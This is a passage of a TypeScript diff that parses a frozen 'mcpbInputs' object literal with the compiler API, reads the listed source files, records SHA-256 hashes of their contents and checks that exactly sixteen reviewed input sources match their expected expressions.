+  const mcpbInputsInitializer = matrix.declarations.get("mcpbInputs");
+  const mcpbInputsObject =
+    mcpbInputsInitializer !== undefined &&
+    ts.isCallExpression(mcpbInputsInitializer) &&
+    mcpbInputsInitializer.arguments.length === 1 &&
+    ts.isPropertyAccessExpression(mcpbInputsInitializer.expression) &&
+    ts.isIdentifier(mcpbInputsInitializer.expression.expression) &&
+    mcpbInputsInitializer.expression.expression.text === "Object" &&
+    mcpbInputsInitializer.expression.name.text === "freeze" &&
+    mcpbInputsInitializer.arguments[0] !== undefined &&
+    ts.isObjectLiteralExpression(mcpbInputsInitializer.arguments[0])
+      ? mcpbInputsInitializer.arguments[0]
+      : null;
+  const mcpbInputProperties = new Map<string, ts.Expression>();
+  if (mcpbInputsObject !== null) {
+    for (const property of mcpbInputsObject.properties) {
+      if (ts.isPropertyAssignment(property) && (ts.isIdentifier(property.name) || ts.isStringLiteral(property.name))) {
+        mcpbInputProperties.set(property.name.text, property.initializer);
+      } else if (ts.isShorthandPropertyAssignment(property)) {
+        mcpbInputProperties.set(property.name.text, property.name);
+      }
+    }
+  }
+  for (const source of newSources) {
+    if (source.kind === "constant") {
+      const initializer = source.declaration === undefined ? undefined : matrix.declarations.get(source.declaration);
+      const value = resolveStaticString(initializer, matrix.declarations);
+      if (
+        source.declaration === undefined ||
+        source.legacyExpression !== source.declaration ||
+        initializer === undefined ||
+        value === null
+      ) {
+        problems.push(`current new source ${source.id} has no exact static declaration ${source.declaration}`);
+        continue;
+      }
+      sources.push(
+        Object.freeze({
+          id: source.id,
+          legacyExpressions: Object.freeze([source.legacyExpression]),
+          declarativeBinding: source.binding,
+          origin: Object.freeze({
+            kind: "constant" as const,
+            declarationExpression: initializer.getText(matrix.sourceFile)
+          }),
+          contentSha256: sha256(value)
+        })
+      );
+      currentValues.set(source.id, value);
+      continue;
+    }
+    const initializer = source.inputProperty === undefined ? undefined : mcpbInputProperties.get(source.inputProperty);
+    if (
+      source.inputProperty === undefined ||
+      source.path === undefined ||
+      source.readExpression === undefined ||
+      source.legacyExpression !== `mcpbInputs.${source.inputProperty}` ||
+      initializer === undefined ||
+      initializer.getText(matrix.sourceFile) !== source.readExpression
+    ) {
+      problems.push(`current new file source ${source.id} has no exact mcpbInputs read binding`);
+      continue;
+    }
+    let value: string;
+    try {
+      value = readFileSync(new URL(`../${source.path}`, import.meta.url), "utf8");
+    } catch (error: unknown) {
+      problems.push(`current new file source ${source.id} could not be read: ${String(error)}`);
+      continue;
+    }
+    sources.push(
+      Object.freeze({
+        id: source.id,
+        legacyExpressions: Object.freeze([source.legacyExpression]),
+        declarativeBinding: source.binding,
+        origin: Object.freeze({ kind: "file" as const, path: source.path }),
+        contentSha256: sha256(value)
+      })
+    );
+    currentValues.set(source.id, value);
+  }
+  const expectedMcpbInputProperties = new Set(currentMcpbInputs.map((entry) => entry.property));
+  const currentSourceIds = new Set(sources.map((source) => source.id));
+  const exactMcpbInputClosure =
+    mcpbInputsObject !== null &&
+    currentMcpbInputs.length === 16 &&
+    expectedMcpbInputProperties.size === 16 &&
+    mcpbInputProperties.size === 16 &&
+    [...mcpbInputProperties].every(([property, initializer]) => {
+      const expected = currentMcpbInputs.find((entry) => entry.property === property);
+      return (
+        expected !== undefined &&
+        initializer.getText(matrix.sourceFile) === expected.expression &&
+        currentSourceIds.has(expected.sourceId)
+      );
+    });
+  if (!exactMcpbInputClosure) {
+    problems.push("current transition mcpbInputs must retain the exact reviewed 16-source companion closure");
+  }
+  return Object.freeze({
+    problems: Object.freeze(problems),
+    sources: Object.freeze(sources),
+    values: currentValues as ReadonlyMap<string, string>
+  });
 }
